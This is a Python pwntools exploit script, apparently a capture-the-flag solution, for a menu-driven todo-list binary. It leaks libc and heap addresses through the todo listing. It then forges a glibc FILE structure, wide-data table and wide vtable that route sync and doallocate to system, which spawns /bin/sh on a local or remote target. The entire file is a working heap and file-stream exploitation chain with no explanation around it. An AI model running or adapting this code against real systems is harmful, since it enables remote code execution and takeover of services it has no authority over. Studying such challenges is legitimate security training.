from pwn import *
import time
import sys

context.terminal = ["tmux", "split-window", "-vf"]
context.log_level = "warn"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./run_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
handle all nostop
break *_IO_wdoallocbuf+52
'''

elf = context.binary = ELF(binary)
libc = ELF("./libc.so.6")

def unpack_ptr(ptr):
    if (len(ptr) < 8):
        ptr = ptr + ((8 - len(ptr)) * b"\x00")
    return u64(ptr)


def init():
    if (args.GDB):
        pp = process(binary)# env=env)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def segv():
    pp.recvuntil(b">> ")
    pp.sendline(b"5")
    pp.recvuntil(b">>")
    pp.sendline(b"-1");
    pp.recvuntil(b">> ")
    pp.sendline(b"nop")

def create_todo(content, size):
    pp.recvuntil(b">> ")
    pp.sendline(b"1")
    pp.recvuntil(b">> ")
    pp.sendline(str(size).encode())
    pp.recvuntil(b">> ")
    pp.send(content)

def list_todos(idx):
    pp.recvuntil(b">> ")
    pp.sendline(b"2")
    return pp.recvuntil(b"1.").replace(b"1.", b"").split(b"[ ] - ")[idx + 1].rstrip()

def dump_todos():
    pp.recvuntil(b">> ")
    pp.sendline(b"4")

def edit_todo(content, idx):
    pp.recvuntil(b">> ")
    pp.sendline(b"3")
    pp.recvuntil(b">>")
    pp.sendline(str(idx).encode())
    pp.recvuntil(b">>")
    pp.send(content)
    
class _IO_jump_t:
    address = 0
    dummy = 0
    dummy2 = 0
    finish = 0
    overflow = 0
    underflow = 0
    uflow = 0
    pbackfail = 0
    xsputn = 0
    xsgetn = 0
    seekoff = 0
    seekpos = 0
    setbuf = 0
    sync = 0
    doallocate = 0
    read = 0
    write = 0
    seek = 0
    close = 0
    stat = 0
    showmanyc = 0
    imbue = 0
    def encode(self):
        pay = p64(self.dummy) + p64(self.dummy2)
        pay+= p64(self.finish)
        pay+= p64(self.overflow)
        pay+= p64(self.underflow)
        pay+= p64(self.uflow)
        pay+= p64(self.pbackfail)
        pay+= p64(self.xsputn)
        pay+= p64(self.xsgetn)
        pay+= p64(self.seekoff)
        pay+= p64(self.seekpos)
        pay+= p64(self.setbuf)
        pay+= p64(self.sync)
        pay+= p64(self.doallocate)
        pay+= p64(self.read)
        pay+= p64(self.write)
        pay+= p64(self.seek)
        pay+= p64(self.close)
        pay+= p64(self.stat)
        pay+= p64(self.showmanyc)
        pay+= p64(self.imbue)
        return (pay)
    def init(self):
        self.finish = libc.sym["_IO_new_file_finish"]
        self.overflow = libc.sym["__GI__IO_wfile_overflow"]
        self.underflow = libc.sym["__GI__IO_wfile_underflow"]
        self.uflow = libc.sym["__GI__IO_wdefault_uflow"]
        self.pbackfail = libc.sym["__GI__IO_wdefault_pbackfail"]
        self.xsputn = libc.sym["__GI__IO_wfile_xsputn"]
        self.xsgetn = libc.sym["__GI__IO_file_xsgetn"]
        self.seekoff = libc.sym["__GI__IO_wfile_seekoff"]
        self.seekpos = libc.sym["_IO_default_seekpos"]
        self.setbuf = libc.sym["_IO_new_file_setbuf"]
        self.sync = libc.sym["__GI__IO_wfile_sync"]
        self.doallocate = libc.sym["_IO_wfile_doallocate"]
        self.read = libc.sym["__GI__IO_file_read"]
        self.write = libc.sym["_IO_new_file_write"]
        self.seek = libc.sym["__GI__IO_file_seek"]
        self.close = libc.sym["__GI__IO_file_close"]
        self.stat = libc.sym["__GI__IO_file_stat"]
        self.showmanyc = libc.sym["_IO_default_showmanyc"]
        self.imbue = libc.sym["_IO_default_imbue"]


class _IO_wide_data:
    address = 0
    _wide_vtable = 0
    def encode(self):
        pay = b"\x00" * 224 + p64(self._wide_vtable)
        return (pay)

def exploit(pp):
    log.info("binary loaded")
    time.sleep(18)
    segv()
    sleep(2)
    if (args.GDB):
        gdb.attach(pp, gdbscript=gdbscript)
    log.info("x is freed")
    log.info("allocating x")
    libc_leak = 120 - 16
    heap_leak = 152 - 16
    pp.recvuntil(b">> ")
    pp.recvuntil(b">> ")
    create_todo(b"/bin/sh\x00", 12)
    create_todo(cyclic(libc_leak), 463)
    _chain = unpack_ptr(list_todos(1).replace(cyclic(libc_leak), b""))      # points to stderr
    edit_todo(cyclic(heap_leak), 1)
    _lock = unpack_ptr(list_todos(1).replace(cyclic(heap_leak), b""))
    libc.address = _chain - 2172128
    elf.heap = _lock - 896

    print(f"libc leaked {hex(_chain)}")
    print(f"heap leaked {hex(_lock)}")
    print(f"libc base {hex(libc.address)}")
    print(f"heap base {hex(elf.heap)}")

    # gadget = libc.address + 0xf6237
    # allocating the _wide_vtable
    wide_jump_table = _IO_jump_t()
    wide_jump_table.init()
    wide_jump_table.sync = libc.sym["system"]
    wide_jump_table.doallocate = libc.sym["system"]
    wvtpay = wide_jump_table.encode()
    create_todo(wvtpay, len(wvtpay))
    wide_jump_table.address = elf.heap + 1184
    print(f"wide jump table {hex(wide_jump_table.address)}")

    # allocating wide table
    wide_table = _IO_wide_data()
    wide_table._wide_vtable = wide_jump_table.address
    wtpay = wide_table.encode()
    create_todo(wtpay, len(wtpay))
    wide_table.address = elf.heap + 1376
    print(f"wide table {hex(wide_table.address)}")


    filepay = FileStructure()
    filepay.flags = 0x2020202020202020
    filepay._IO_read_ptr = 0x68732f6e69622f
    # filepay._IO_read_ptr = 0x2f2a742f20746163
    # if (args.REMOTE):
    #     filepay._IO_read_ptr = 0x2f2a612f20746163
    # filepay._IO_read_end = 0x32263e31202a66 
    filepay._lock = _lock
    filepay.chain = _chain
    filepay._wide_data = wide_table.address
    filepay.vtable = libc.sym["_IO_wfile_jumps"] - 0x48
    edit_todo(bytes(filepay), 1)
    log.info("calling the gadget now")
    dump_todos()
    pp.sendline(b"exec 1>&2")
    
    pp.interactive()

pp = init()
exploit(pp)
